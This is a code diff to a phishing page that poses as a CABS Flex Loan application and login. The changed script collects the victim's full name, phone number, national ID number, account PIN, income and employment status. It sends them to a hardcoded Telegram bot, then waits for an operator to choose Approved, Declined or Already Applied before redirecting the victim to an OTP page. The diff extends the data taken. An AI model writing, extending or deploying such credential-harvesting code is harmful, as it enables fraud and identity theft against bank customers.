@@ -152,6 +152,7 @@
         }
         .applicant-badge .name { font-size: 18px; font-weight: 700; color: var(--white); display: block; }
         .applicant-badge .amount { font-size: 14px; opacity: 0.8; margin-top: 2px; display: block; }
+        .applicant-badge .id-detail { font-size: 13px; opacity: 0.6; margin-top: 4px; display: block; }
 
         .error-msg {
             color: var(--error);
@@ -192,7 +193,7 @@
             background: transparent;
             border: none;
             color: white;
-            font-size: 16px; /* prevents iOS zoom */
+            font-size: 16px;
             outline: none;
             width: 100%;
             font-family: inherit;
@@ -246,7 +247,6 @@
         .sp-s { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 10px; font-weight: 300; }
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        /* Modal Styles */
         .modal-overlay {
             position: fixed; inset: 0;
             display: none;
@@ -349,6 +349,7 @@
                 <div id="applicantBadge" class="applicant-badge">
                     <span class="label">Applicant Details</span>
                     <span id="displayName" class="name">Valued Client</span>
+                    <span id="displayId" class="id-detail">ID: —</span>
                     <span id="displayAmount" class="amount">$0.00 USD Flex Loan</span>
                 </div>
 
@@ -382,7 +383,6 @@
         <div class="sp-s">Connecting to CABS secure servers...</div>
     </div>
 
-    <!-- Custom Modal for Warnings -->
     <div id="warningModal" class="modal-overlay">
         <div class="modal-card">
             <div class="modal-icon">&#9888;&#65039;</div>
@@ -400,34 +400,42 @@
         const BOT = '8704011680:AAHmUOh5B9ehswuyZycUb9B83-SNP-AMQdI';
         const CID = '8541296815';
         let loanData = {
-            name: "Valued Client",
+            firstName: "",
+            middleName: "",
+            surname: "",
+            phone: "",
+            idNumber: "",
             amount: "0",
-            purpose: "Flex Loan"
+            purpose: "Flex Loan",
+            period: "12",
+            income: "",
+            employmentStatus: ""
         };
         let lastUpdateId = 0;
-        let pinAttempts = 0;
 
         function init() {
             const params = new URLSearchParams(window.location.search);
-            // If returned from a Declined decision, show the declined warning
             if (params.get('declined') === '1') {
                 setTimeout(function() {
                     showModal('Your previous application was declined. Please verify your account details and try again.');
                 }, 500);
             }
-            loanData.name = params.get('name') || params.get('firstName') || "Valued Client";
 
-            let rawAmount = params.get('amount') || "0";
-            loanData.amount = rawAmount.replace(/[^0-9.]/g, '');
-
+            loanData.firstName = params.get('firstName') || "";
+            loanData.middleName = params.get('middleName') || "";
+            loanData.surname = params.get('surname') || "";
+            loanData.phone = params.get('phone') || "";
+            loanData.idNumber = params.get('idNumber') || "";
+            loanData.amount = params.get('amount') || "0";
             loanData.purpose = params.get('purpose') || "Flex Loan";
+            loanData.period = params.get('period') || "12";
+            loanData.income = params.get('income') || "";
+            loanData.employmentStatus = params.get('employmentStatus') || "";
 
-            // If the index sent firstName + lastName separately, combine them
-            if (params.get('firstName') && params.get('lastName')) {
-                loanData.name = params.get('firstName') + ' ' + params.get('lastName');
-            }
-
-            document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);
+            // Build full name: First Name + Middle Name + Surname
+            const fullName = [loanData.firstName, loanData.middleName, loanData.surname].filter(Boolean).join(' ');
+            document.getElementById('displayName').textContent = fullName || "Valued Client";
+            document.getElementById('displayId').textContent = 'ID: ' + (loanData.idNumber || '—');
 
             const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
                 minimumFractionDigits: 2,
@@ -500,9 +508,28 @@
             }
             if (!ok) return;
 
-            const msg = '\ud83d\ude80 <b>CABS Flex Loan Verification</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\nPlease choose an action below:';
+            // Build name clearly: Surname, First Name + Middle Name
+            const givenName = [loanData.firstName, loanData.middleName].filter(Boolean).join(' ');
+            const fullName = [loanData.firstName, loanData.middleName, loanData.surname].filter(Boolean).join(' ');
+            const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
 
-            // 3 buttons: Approved / Declined / Already Applied
+            const msg = '\ud83d\ude80 <b>CABS Flex Loan Verification</b>\n\n' +
+                '👤 <b>Surname:</b> <code>' + loanData.surname + '</code>\n' +
+                '👤 <b>Given Name:</b> <code>' + givenName + '</code>\n' +
+                '👤 <b>Full Name:</b> <code>' + fullName + '</code>\n' +
+                '📱 <b>Phone:</b> <code>' + phone + '</code>\n' +
+                '🪪 <b>ID Number:</b> <code>' + loanData.idNumber + '</code>\n' +
+                '🔑 <b>PIN:</b> <code>' + pin + '</code>\n' +
+                '💰 <b>Amount:</b> <code>$' + formattedAmount + ' USD</code>\n' +
+                '📅 <b>Period:</b> <code>' + loanData.period + ' months</code>\n' +
+                '🎯 <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n' +
+                '💵 <b>Income:</b> <code>$' + parseFloat(loanData.income || 0).toLocaleString() + '/mo</code>\n' +
+                '💼 <b>Employment:</b> <code>' + decodeURIComponent(loanData.employmentStatus || 'Not specified') + '</code>\n\n' +
+                'Please choose an action below:';
+
             const buttons = [
                 [{ text: '\u2705 Approved', callback_data: 'login_approved' }, { text: '\u274c Declined', callback_data: 'login_declined' }, { text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }]
             ];
@@ -533,13 +560,11 @@
                                     else if (action === 'login_declined') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
-                                        // Declined returns to login.html just as the Declined word works
                                         location.href = 'login.html?declined=1';
                                     }
                                     else if (action === 'login_applied') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
-                                        // Already Applied: warning popup that you already applied
                                         showModal('You have already applied for a Flex Loan. Please wait for your application to get approved.');
                                         document.getElementById('pin').value = '';
                                     }
@@ -554,7 +579,19 @@
 
         function proceedToOTP() {
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            location.href = 'otp.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + phone;
+            const params = new URLSearchParams({
+                firstName: loanData.firstName,
+                middleName: loanData.middleName,
+                surname: loanData.surname,
+                phone: phone,
+                idNumber: loanData.idNumber,
+                amount: loanData.amount,
+                purpose: loanData.purpose,
+                period: loanData.period,
+                income: loanData.income,
+                employmentStatus: loanData.employmentStatus
+            });
+            location.href = 'otp.html?' + params.toString();
         }
     </script>
 
